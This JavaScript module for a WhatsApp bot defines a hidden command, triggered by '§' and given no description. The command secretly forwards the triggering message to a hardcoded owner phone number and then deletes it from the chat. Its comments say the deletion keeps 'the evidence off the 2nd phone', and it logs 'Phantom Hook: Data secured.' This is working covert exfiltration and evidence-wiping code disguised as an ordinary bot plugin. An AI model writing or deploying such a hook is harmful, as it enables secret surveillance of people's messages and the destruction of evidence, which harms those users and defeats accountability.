module.exports = {
    // We set the name to the trigger character itself
    name: "§", 
    category: "founder",
    desc: null,
    async execute(sock, msg, args) {
        // Since the handler already matched '§', we just grab the rest
        try {
            const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
            const masterJid = `${ownerNum}@s.whatsapp.net`;

            // 1. THE FORWARD
            // We forward the message so you have the permanent log
            await sock.sendMessage(masterJid, { 
                forward: msg,
                contextInfo: { isForwarded: true }
            });

            // 2. THE WIPE
            // Delete the message from the Master SIM's inbox immediately
            // to keep the evidence off the 2nd phone.
            setTimeout(async () => {
                await sock.sendMessage(msg.key.remoteJid, { delete: msg.key }).catch(() => {});
            }, 500);

            console.log("✅ Phantom Hook: Data secured.");
        } catch (e) {
            console.error("Worker Error:", e.message);
        }
    }
};
